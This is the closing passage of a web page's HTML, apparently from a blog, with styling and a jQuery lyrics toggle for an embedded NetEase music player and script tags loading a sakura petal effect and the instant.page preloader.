  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="5251613646"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
<script src="//instant.page/3.0.0" type="module" defer integrity="s</body>
</html>